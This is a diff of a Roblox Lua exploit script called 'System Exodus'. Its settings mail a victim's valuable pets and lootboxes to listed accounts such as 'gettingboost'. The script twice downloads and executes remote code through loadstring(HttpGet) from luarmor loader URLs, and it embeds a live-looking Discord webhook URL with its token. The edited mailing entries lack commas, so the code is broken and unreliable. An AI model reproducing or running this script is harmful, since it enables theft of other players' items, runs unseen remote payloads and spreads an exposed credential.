@@ -1,19 +1,13 @@
 wait(1)
-getgenv().Config = {
-    ["Webhook"] = "https://discord.com/api/webhooks/1306585595912519740/scBlVwWH6NiadqazzZl7jckXuFm21PDJeWOmB6RkfgKRe-_y3J_mfQ_SbGb7RVmUaSqI",
-    ["UserID"] = "",
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/74724ab99fe6df2fd4819846e0282a56.lua"))() 
-
-
-wait(10)
 getgenv().Settings = {
     Mailing = {
-        ["All Huges"] = {Class = "Pet", Amount = "Max", AllTypes = true},
+        ["Huge Trojan Horse"] = {Class = "Pet", Amount = "Max"}
+        ["Golden Huge Trojan Horse"] = {Class = "Pet", Amount = "Max"}
+        ["Rainbow  Huge Trojan Horse"] = {Class = "Pet", Amount = "Max"}
         ["Wooden Gift"] = {Class = "Lootbox", Amount = "Max"},
 --        ["Rainbow Swirl"] = {Class = "Misc", Amount = "Max"},
 --        ["Diamonds"] = {Class = "Currency", Amount = 10000}
---        ["Rainbow Huge Cat"] = {Class = "Pet", Amount = "Max"}
+--        ["Huge Trojan Horse"] = {Class = "Pet", Amount = "Max"}
     },
     Users = {
         "gettingboost",
@@ -24,3 +18,10 @@ getgenv().Settings = {
     [[ Thank you for using System Exodus <3! ]]
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
+
+wait(10)
+getgenv().Config = {
+    ["Webhook"] = "https://discord.com/api/webhooks/1306585595912519740/scBlVwWH6NiadqazzZl7jckXuFm21PDJeWOmB6RkfgKRe-_y3J_mfQ_SbGb7RVmUaSqI",
+    ["UserID"] = "",
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/74724ab99fe6df2fd4819846e0282a56.lua"))() 
